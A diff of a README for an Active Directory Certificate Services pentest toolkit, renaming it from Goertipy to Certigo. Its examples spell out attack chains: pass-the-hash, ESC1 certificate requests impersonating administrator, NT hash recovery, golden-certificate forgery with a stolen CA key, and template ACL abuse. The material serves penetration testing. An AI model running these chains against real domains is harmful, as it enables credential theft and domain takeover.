@@ -1,7 +1,7 @@
-# Goertipy
+# Certigo
 
 <p align="center">
-  <img src="certigo.jpg" alt="Goertipy" width="300">
+  <img src="certigo.jpg" alt="Certigo" width="300">
 </p>
 
 An Active Directory Certificate Services (AD CS) enumeration and exploitation toolkit written in Go. Inspired by [Certipy](https://github.com/ly4k/Certipy), designed for portability and performance.
@@ -25,15 +25,15 @@ An Active Directory Certificate Services (AD CS) enumeration and exploitation to
 ## Installation
 
 ```bash
-go install github.com/ineffectivecoder/goertipy/cmd/goertipy@latest
+go install github.com/ineffectivecoder/certigo/cmd/certigo@latest
 ```
 
 Or build from source:
 
 ```bash
-git clone https://github.com/ineffectivecoder/goertipy.git
-cd goertipy
-go build -o goertipy ./cmd/goertipy
+git clone https://github.com/ineffectivecoder/certigo.git
+cd certigo
+go build -o certigo ./cmd/certigo
 ```
 
 ## Commands
@@ -59,34 +59,34 @@ go build -o goertipy ./cmd/goertipy
 
 ```bash
 # Basic enumeration
-goertipy find -u user@corp.local --dc-ip 10.0.0.1
+certigo find -u user@corp.local --dc-ip 10.0.0.1
 
 # With NTLM hash (pass-the-hash)
-goertipy find -u administrator -d corp.local --dc-ip 10.0.0.1 -H :aabbccdd11223344
+certigo find -u administrator -d corp.local --dc-ip 10.0.0.1 -H :aabbccdd11223344
 
 # Only vulnerable templates
-goertipy find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable
+certigo find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable
 
 # Enabled + vulnerable only
-goertipy find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable --enabled
+certigo find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable --enabled
 
 # Filter by CA name
-goertipy find -u user@corp.local --dc-ip 10.0.0.1 --ca-name 'corp-CA'
+certigo find -u user@corp.local --dc-ip 10.0.0.1 --ca-name 'corp-CA'
 
 # JSON output
-goertipy find -u user@corp.local --dc-ip 10.0.0.1 --json
+certigo find -u user@corp.local --dc-ip 10.0.0.1 --json
 
 # Generate Markdown pentest report
-goertipy find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable --report
+certigo find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable --report
 
 # Generate self-contained HTML report (dark theme)
-goertipy find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable --report-html
+certigo find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable --report-html
 
 # Generate PDF report (requires wkhtmltopdf or Chrome)
-goertipy find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable --report-pdf
+certigo find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable --report-pdf
 
 # Generate all formats at once
-goertipy find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable --report --report-html --report-pdf
+certigo find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable --report --report-html --report-pdf
 ```
 
 | Flag | Short | Description |
@@ -115,20 +115,20 @@ Three transport options for enrollment:
 
 ```bash
 # Request via RPC (default — resolves endpoint via EPM on port 135)
-goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' --template User
+certigo req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' --template User
 
 # Request via SMB named pipe (port 445, no EPM needed)
-goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' --template User --pipe
+certigo req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' --template User --pipe
 
 # Request via HTTP/HTTPS (certsrv web enrollment)
-goertipy req -u user@corp.local --web http://ca.corp.local --ca 'corp-CA' --template User
+certigo req -u user@corp.local --web http://ca.corp.local --ca 'corp-CA' --template User
 
 # ESC1 — Request cert with UPN SAN override
-goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' \
+certigo req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' \
   --template VulnTemplate --upn administrator@corp.local
 
 # Retrieve a pending certificate (works with all transports)
-goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' --retrieve 42
+certigo req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' --retrieve 42
 ```
 
 | Flag | Short | Description |
@@ -158,16 +158,16 @@ Authenticate with a certificate and recover the NT hash — combines `gettgtpkin
 
 ```bash
 # Authenticate with PFX and recover NT hash
-goertipy auth -u administrator@corp.local --dc-ip 10.0.0.1 --pfx admin.pfx
+certigo auth -u administrator@corp.local --dc-ip 10.0.0.1 --pfx admin.pfx
 
 # Skip NT hash recovery
-goertipy auth -u administrator@corp.local --dc-ip 10.0.0.1 --pfx admin.pfx --no-hash
+certigo auth -u administrator@corp.local --dc-ip 10.0.0.1 --pfx admin.pfx --no-hash
 
 # Custom output path
-goertipy auth -u administrator@corp.local --dc-ip 10.0.0.1 --pfx admin.pfx -o admin.ccache
+certigo auth -u administrator@corp.local --dc-ip 10.0.0.1 --pfx admin.pfx -o admin.ccache
 
 # Base64-encoded PFX (useful for scripting)
-goertipy auth -u admin@corp.local --dc-ip 10.0.0.1 --pfx-base64 "MIIJ..."
+certigo auth -u admin@corp.local --dc-ip 10.0.0.1 --pfx-base64 "MIIJ..."
 ```
 
 | Flag | Short | Description |
@@ -189,13 +189,13 @@ goertipy auth -u admin@corp.local --dc-ip 10.0.0.1 --pfx-base64 "MIIJ..."
 
 ```bash
 # Inspect a PFX certificate
-goertipy cert show certificate.pfx
+certigo cert show certificate.pfx
 
 # With password-protected PFX
-goertipy cert show encrypted.pfx --pfx-pass mypassword
+certigo cert show encrypted.pfx --pfx-pass mypassword
 
 # Inspect a PEM certificate
-goertipy cert show ca-cert.pem
+certigo cert show ca-cert.pem
 ```
 
 Displays: Subject, Issuer, Serial, Validity, Signature Algorithm, Public Key (algorithm + size), Key Usage, Extended Key Usages, SANs, and CA chain.
@@ -210,22 +210,22 @@ Displays: Subject, Issuer, Serial, Validity, Signature Algorithm, Public Key (al
 
 ```bash
 # Backup CA certificate from LDAP
-goertipy ca backup --ca 'corp-CA' -u user@corp.local --dc-ip 10.0.0.1
+certigo ca backup --ca 'corp-CA' -u user@corp.local --dc-ip 10.0.0.1
 
 # Dump CA configuration (EditFlags, RequestDisposition, CAType, etc.)
-goertipy ca config --ca 'corp-CA' -u admin -d corp.local --dc-ip 10.0.0.1 -H :hash
+certigo ca config --ca 'corp-CA' -u admin -d corp.local --dc-ip 10.0.0.1 -H :hash
 
 # Revoke a certificate by serial number
-goertipy ca revoke --ca 'corp-CA' --serial 0x1234 --reason keyCompromise \
+certigo ca revoke --ca 'corp-CA' --serial 0x1234 --reason keyCompromise \
   -u admin -d corp.local --dc-ip 10.0.0.1 -H :hash
 
 # List templates enabled on the CA
-goertipy ca list-templates --ca 'corp-CA' -u admin -d corp.local --dc-ip 10.0.0.1
+certigo ca list-templates --ca 'corp-CA' -u admin -d corp.local --dc-ip 10.0.0.1
 
 # Enable/disable a template
-goertipy ca enable-template --ca 'corp-CA' --template WebServer --template-oid 1.3.6.1... \
+certigo ca enable-template --ca 'corp-CA' --template WebServer --template-oid 1.3.6.1... \
   -u admin -d corp.local --dc-ip 10.0.0.1
-goertipy ca disable-template --ca 'corp-CA' --template WebServer \
+certigo ca disable-template --ca 'corp-CA' --template WebServer \
   -u admin -d corp.local --dc-ip 10.0.0.1
 ```
 
@@ -251,17 +251,17 @@ goertipy ca disable-template --ca 'corp-CA' --template WebServer \
 
 ### Forge (Golden Certificate)
 
-Forge a certificate as any user using a stolen CA private key. The forged cert can be used with `goertipy auth` for PKINIT authentication.
+Forge a certificate as any user using a stolen CA private key. The forged cert can be used with `certigo auth` for PKINIT authentication.
 
 ```bash
 # Forge a cert as administrator using stolen CA PFX
-goertipy forge --ca-pfx stolen-ca.pfx --ca-pfx-pass BackupPassword --upn administrator@corp.local
+certigo forge --ca-pfx stolen-ca.pfx --ca-pfx-pass BackupPassword --upn administrator@corp.local
 
 # Using PEM cert + key pair
-goertipy forge --ca-cert ca.pem --ca-key ca.key --upn administrator@corp.local
+certigo forge --ca-cert ca.pem --ca-key ca.key --upn administrator@corp.local
 
 # Custom validity and output
-goertipy forge --ca-pfx ca.pfx --upn admin@corp.local --validity 30 -o golden.pfx
+certigo forge --ca-pfx ca.pfx --upn admin@corp.local --validity 30 -o golden.pfx
 ```
 
 | Flag | Short | Description |
@@ -286,11 +286,11 @@ Modify a certificate template's attributes to make it ESC1-exploitable, then res
 
 ```bash
 # Modify template (saves backup automatically)
-goertipy template modify -u user@corp.local --dc-ip 10.0.0.1 \
+certigo template modify -u user@corp.local --dc-ip 10.0.0.1 \
   --template VulnTemplate
 
 # Restore original template from backup
-goertipy template restore -u user@corp.local --dc-ip 10.0.0.1 \
+certigo template restore -u user@corp.local --dc-ip 10.0.0.1 \
   --backup VulnTemplate_backup.json
 ```
 
@@ -320,14 +320,14 @@ goertipy template restore -u user@corp.local --dc-ip 10.0.0.1 \
 
 ```bash
 # 1. Find vulnerable templates
-goertipy find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable
+certigo find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable
 
 # 2. Request cert with admin UPN
-goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' \
+certigo req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' \
   --template VulnTemplate --upn administrator@corp.local
 
 # 3. Authenticate and recover NT hash
-goertipy auth -u administrator@corp.local --dc-ip 10.0.0.1 \
+certigo auth -u administrator@corp.local --dc-ip 10.0.0.1 \
   --pfx corp-CA_VulnTemplate.pfx
 ```
 
@@ -335,22 +335,22 @@ goertipy auth -u administrator@corp.local --dc-ip 10.0.0.1 \
 
 ```bash
 # 1. Find templates with dangerous ACLs
-goertipy find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable --enabled
+certigo find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable --enabled
 
 # 2. Modify template to be ESC1-exploitable (auto-saves backup)
-goertipy template modify -u user@corp.local --dc-ip 10.0.0.1 \
+certigo template modify -u user@corp.local --dc-ip 10.0.0.1 \
   --template VulnTemplate
 
 # 3. Request cert with admin UPN (now ESC1)
-goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' \
+certigo req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' \
   --template VulnTemplate --upn administrator@corp.local
 
 # 4. Restore original template
-goertipy template restore -u user@corp.local --dc-ip 10.0.0.1 \
+certigo template restore -u user@corp.local --dc-ip 10.0.0.1 \
   --backup VulnTemplate_backup.json
 
 # 5. Authenticate with forged cert
-goertipy auth -u administrator@corp.local --dc-ip 10.0.0.1 \
+certigo auth -u administrator@corp.local --dc-ip 10.0.0.1 \
   --pfx corp-CA_VulnTemplate.pfx
 ```
 
@@ -367,10 +367,10 @@ smbclient.py 'domain/admin:password@CA-IP'
 # > get CA-Name.p12
 
 # 3. Forge a golden cert
-goertipy forge --ca-pfx CA-Name.p12 --ca-pfx-pass BackupPass --upn administrator@corp.local
+certigo forge --ca-pfx CA-Name.p12 --ca-pfx-pass BackupPass --upn administrator@corp.local
 
 # 4. Authenticate → TGT + NT hash
-goertipy auth -u administrator@corp.local --dc-ip 10.0.0.1 \
+certigo auth -u administrator@corp.local --dc-ip 10.0.0.1 \
   --pfx forged_administrator_corp.local.pfx
 
 # 5. Use the NT hash
@@ -394,7 +394,7 @@ All commands support routing traffic through a SOCKS5 proxy:
 ```bash
 # Via environment variable
 export ALL_PROXY=socks5://127.0.0.1:1080
-goertipy find -u user@corp.local --dc-ip 10.0.0.1
+certigo find -u user@corp.local --dc-ip 10.0.0.1
 
 # Useful with Chisel, ligolo-ng, or SSH tunnels
 ```
@@ -417,8 +417,8 @@ goertipy find -u user@corp.local --dc-ip 10.0.0.1
 ## Project Structure
 
 ```
-goertipy/
-├── cmd/goertipy/         # CLI entry point
+certigo/
+├── cmd/certigo/         # CLI entry point
 ├── docs/                 # Deep dive documentation with protocol diagrams
 ├── internal/commands/    # Cobra command definitions (find, req, auth, cert, ca, forge, template)
 └── pkg/
